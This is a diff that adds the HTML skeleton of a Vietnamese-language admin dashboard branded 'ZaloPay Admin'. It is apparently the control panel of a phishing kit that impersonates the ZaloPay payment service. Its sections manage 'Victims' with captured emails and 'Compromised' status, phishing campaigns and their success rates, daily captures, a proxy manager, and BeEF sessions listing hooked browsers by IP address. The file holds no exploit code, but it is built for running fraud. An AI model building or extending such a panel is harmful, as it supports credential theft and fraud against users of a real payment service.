@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="">
+    <title>ZaloPay Admin - Quản trị hệ thống</title>
+    <meta name="description" content="ZaloPay Admin Dashboard - Quản trị và giám sát hệ thống">
+</head>
+<body>
+    <!-- Admin Header -->
+    <header class="admin-header">
+        <div class="container">
+            <div class="flex justify-between items-center">
+                <div class="zalopay-logo">
+                    ZaloPay Admin
+                </div>
+                <div class="flex items-center space-x-4">
+                    <span id="userInfo" data-user-info></span>
+                    <button id="logoutBtn" class="btn btn-outline">Đăng xuất</button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Admin Layout -->
+    <div class="admin-layout">
+        <!-- Sidebar -->
+        <aside class="admin-sidebar">
+            <nav>
+                <ul>
+                    <li><a href="#dashboard" class="active">Dashboard</a></li>
+                    <li><a href="#victims">Victims</a></li>
+                    <li><a href="#campaigns">Campaigns</a></li>
+                    <li><a href="#analytics">Analytics</a></li>
+                    <li><a href="#proxy">Proxy Manager</a></li>
+                    <li><a href="#beef">BeEF Control</a></li>
+                    <li><a href="#settings">Settings</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="admin-main">
+            <!-- Dashboard -->
+            <section id="dashboard" class="admin-section active">
+                <h2>Dashboard</h2>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h3>Total Victims</h3>
+                        <div class="stat-number" id="totalVictims">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Active Campaigns</h3>
+                        <div class="stat-number" id="activeCampaigns">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Today's Captures</h3>
+                        <div class="stat-number" id="todayCaptures">0</div>
+                    </div>
+                    <div class="stat-card">
+                        <h3>System Health</h3>
+                        <div class="stat-number" id="systemHealth">Good</div>
+                    </div>
+                </div>
+
+                <div class="chart-container">
+                    <h3>Activity Overview</h3>
+                    <canvas id="activityChart"></canvas>
+                </div>
+            </section>
+
+            <!-- Victims Section -->
+            <section id="victims" class="admin-section">
+                <h2>Victims Management</h2>
+                <div class="filters">
+                    <input type="text" placeholder="Search victims..." id="victimSearch">
+                    <select id="victimFilter">
+                        <option value="">All Status</option>
+                        <option value="active">Active</option>
+                        <option value="inactive">Inactive</option>
+                        <option value="compromised">Compromised</option>
+                    </select>
+                </div>
+                <table id="victimsTable" class="data-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Email</th>
+                            <th>Status</th>
+                            <th>Captured At</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="victimsTableBody">
+                        <!-- Data will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Campaigns Section -->
+            <section id="campaigns" class="admin-section">
+                <h2>Campaign Management</h2>
+                <div class="section-header">
+                    <button id="newCampaignBtn" class="btn btn-primary">New Campaign</button>
+                </div>
+                <table id="campaignsTable" class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Name</th>
+                            <th>Status</th>
+                            <th>Victims</th>
+                            <th>Success Rate</th>
+                            <th>Created</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="campaignsTableBody">
+                        <!-- Data will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Analytics Section -->
+            <section id="analytics" class="admin-section">
+                <h2>Analytics</h2>
+                <div class="analytics-grid">
+                    <div class="chart-card">
+                        <h3>Victim Acquisition</h3>
+                        <canvas id="acquisitionChart"></canvas>
+                    </div>
+                    <div class="chart-card">
+                        <h3>Geographic Distribution</h3>
+                        <canvas id="geographicChart"></canvas>
+                    </div>
+                    <div class="chart-card">
+                        <h3>Device Types</h3>
+                        <canvas id="deviceChart"></canvas>
+                    </div>
+                    <div class="chart-card">
+                        <h3>Success Rates</h3>
+                        <canvas id="successChart"></canvas>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Proxy Manager -->
+            <section id="proxy" class="admin-section">
+                <h2>Proxy Management</h2>
+                <div class="proxy-controls">
+                    <button id="addProxyBtn" class="btn btn-primary">Add Proxy</button>
+                    <button id="testProxiesBtn" class="btn btn-secondary">Test All</button>
+                </div>
+                <table id="proxiesTable" class="data-table">
+                    <thead>
+                        <tr>
+                            <th>Host</th>
+                            <th>Port</th>
+                            <th>Type</th>
+                            <th>Country</th>
+                            <th>Health</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="proxiesTableBody">
+                        <!-- Data will be populated by JavaScript -->
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- BeEF Control -->
+            <section id="beef" class="admin-section">
+                <h2>BeEF Framework Control</h2>
+                <div class="beef-status">
+                    <div class="status-indicator" id="beefStatus">Checking...</div>
+                    <button id="restartBeefBtn" class="btn btn-warning">Restart BeEF</button>
+                </div>
+                <div class="beef-sessions">
+                    <h3>Active Sessions</h3>
+                    <table id="beefSessionsTable" class="data-table">
+                        <thead>
+                            <tr>
+                                <th>Session ID</th>
+                                <th>IP Address</th>
+                                <th>Browser</th>
+                                <th>Page</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="beefSessionsTableBody">
+                            <!-- Data will be populated by JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Settings -->
+            <section id="settings" class="admin-section">
+                <h2>System Settings</h2>
+                <form id="settingsForm" class="settings-form">
+                    <div class="form-group">
+                        <label for="adminEmail" class="form-label">Admin Email</label>
+                        <input type="email" id="adminEmail" class="form-input">
+                    </div>
+                    <div class="form-group">
+                        <label for="sessionTimeout" class="form-label">Session Timeout (minutes)</label>
+                        <input type="number" id="sessionTimeout" class="form-input" min="5" max="480">
+                    </div>
+                    <div class="form-group">
+                        <label for="maxLoginAttempts" class="form-label">Max Login Attempts</label>
+                        <input type="number" id="maxLoginAttempts" class="form-input" min="3" max="10">
+                    </div>
+                    <button type="submit" class="btn btn-primary">Save Settings</button>
+                </form>
+            </section>
+        </main>
+    </div>
+
+    <!-- Modals -->
+    <div id="modalsContainer">
+        <!-- Modals will be dynamically created by JavaScript -->
+    </div>
+
+    <!-- Footer -->
+    <footer class="admin-footer">
+        <div class="container text-center">
+            <p>ZaloPay Admin Dashboard v1.0.0</p>
+        </div>
+    </footer>
+</body>
+</html>
